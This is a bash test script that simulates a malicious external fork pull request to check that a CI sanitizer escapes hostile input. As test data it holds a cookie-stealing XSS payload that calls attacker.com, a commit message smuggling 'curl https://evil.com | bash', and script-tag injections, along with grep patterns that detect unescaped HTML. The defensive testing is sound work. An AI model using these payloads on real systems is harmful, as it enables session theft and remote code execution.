#!/bin/bash
###############################################################
# Copyright (©) 2024-2025 David H Hoyt. All rights reserved.
###############################################################
#                 https://srd.cx
#
# Last Updated: 17-DEC-2025 1700Z by David Hoyt
#
# Intent: Try Sanitizing User Controllable Inputs
#
#
# 
#
# Comment: Sanitizing User Controllable Input 
#          - is a Moving Target
#          - needs ongoing updates
#          - needs additional unit tests
#
#
#
###############################################################
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "╔════════════════════════════════════════════════════════════╗"
echo "║   Simulating External Fork PR                             ║"
echo "║   Testing: Can anyone submit a PR safely?                 ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo ""

# Simulate external contributor with hostile input
EXTERNAL_USER='<img src=x onerror="fetch(`https://attacker.com?cookie=${document.cookie}`)">'
FORK_BRANCH='feature/<script>alert("XSS in branch name")</script>'
COMMIT_MSG='Fix critical bug"; curl https://evil.com | bash #'
PR_TITLE='[URGENT] Security Fix <script>alert(1)</script>'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "SCENARIO: External Fork PR with Malicious Input"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "External Contributor Details:"
echo "  Username:   $EXTERNAL_USER"
echo "  Fork:       attacker/patchicc"
echo "  Branch:     $FORK_BRANCH"
echo "  Commit:     $COMMIT_MSG"
echo "  PR Title:   $PR_TITLE"
echo ""

# Load TRUSTED sanitizer (from base branch, NOT from PR)
echo "Loading Trusted Sanitizers..."
if [ -r "$SCRIPT_DIR/sanitize.sh" ]; then
  # shellcheck disable=SC1091
  source "$SCRIPT_DIR/sanitize.sh"
  echo "  ✅ Loaded from: base/.github/scripts/sanitize.sh (TRUSTED)"
else
  echo "  ❌ ERROR: Sanitizer not found" >&2
  exit 1
fi
echo ""

# Simulate what GitHub does
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "GitHub Actions Workflow Execution"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Step 1: Which workflow file to use?"
echo "  ❌ NOT using: .github/workflows/ci-pr-action.yml from PR (untrusted)"
echo "  ✅ Using: .github/workflows/ci-pr-action.yml from master (trusted)"
echo ""

echo "Step 2: Checkout PR code (for building)"
echo "  git checkout $FORK_BRANCH"
echo "  ⚠️  Checked out to: \$GITHUB_WORKSPACE (untrusted code)"
echo ""

echo "Step 3: Checkout base commit (for sanitizers)"
echo "  git checkout master base/"
echo "  ✅ Checked out to: base/ (trusted sanitizers)"
echo ""

echo "Step 4: Load sanitizers from TRUSTED base"
echo "  source base/.github/scripts/sanitize.sh"
echo "  ✅ Using sanitizer from BASE, not PR"
echo ""

# Apply sanitization (what the workflow does)
echo "Step 5: Sanitize all untrusted input"
safe_user=$(sanitize_line "$EXTERNAL_USER")
safe_branch=$(sanitize_line "$FORK_BRANCH")
safe_commit=$(sanitize_line "$COMMIT_MSG")
safe_title=$(sanitize_line "$PR_TITLE")

echo "  Input:  $EXTERNAL_USER"
echo "  Output: $safe_user"
echo ""
echo "  Input:  $FORK_BRANCH"
echo "  Output: $safe_branch"
echo ""
echo "  Input:  $COMMIT_MSG"
echo "  Output: $safe_commit"
echo ""
echo "  Input:  $PR_TITLE"
echo "  Output: $safe_title"
echo ""

# Generate workflow summary (as GitHub does)
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Workflow Summary (as displayed in GitHub UI)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

SUMMARY=$(mktemp)
{
  echo "## 🔄 External Fork PR Build"
  echo ""
  echo "**Submitted by:** $safe_user"
  echo "**Fork:** attacker/patchicc"
  echo "**Branch:** \`$safe_branch\`"
  echo "**Title:** $safe_title"
  echo "**Latest commit:** $safe_commit"
  echo ""
  echo "### Build Status"
  echo "✅ Build completed successfully"
  echo "✅ All tests passed"
  echo ""
  echo "### Security"
  echo "✅ All input sanitized"
  echo "✅ No XSS vulnerabilities"
  echo "✅ Safe to review"
} > "$SUMMARY"

cat "$SUMMARY"
echo ""

# Verify sanitization worked
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Verification: Check for XSS in Summary"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

PASS=true

# Check if unescaped HTML exists in the actual summary content
if grep -qE '(<script[^&]|<img[^&]|onerror=[^&])' "$SUMMARY"; then
  echo "  ❌ FAILED: Unescaped HTML found in summary"
  PASS=false
else
  echo "  ✅ PASSED: No unescaped HTML tags in summary"
fi

if grep -qE '&lt;|&gt;|&quot;|&#39;' "$SUMMARY"; then
  echo "  ✅ PASSED: HTML entities properly escaped"
else
  echo "  ⚠️  WARNING: Expected HTML entities not found"
fi

rm -f "$SUMMARY"
echo ""

# Final result
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "CONCLUSION"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

if [ "$PASS" = true ]; then
  echo "✅ SUCCESS: External fork PR safely processed"
  echo ""
  echo "Key Points:"
  echo "  1. ✅ Workflow from BASE branch executed (not from PR)"
  echo "  2. ✅ Sanitizers from BASE branch loaded (not from PR)"
  echo "  3. ✅ All untrusted input sanitized"
  echo "  4. ✅ No XSS vulnerabilities"
  echo "  5. ✅ Safe for reviewers to view"
  echo ""
  echo "ANSWER: YES, anyone can safely submit a PR"
  echo "         The workflows will sanitize all malicious input"
  exit 0
else
  echo "❌ FAILED: Sanitization did not work as expected"
  exit 1
fi
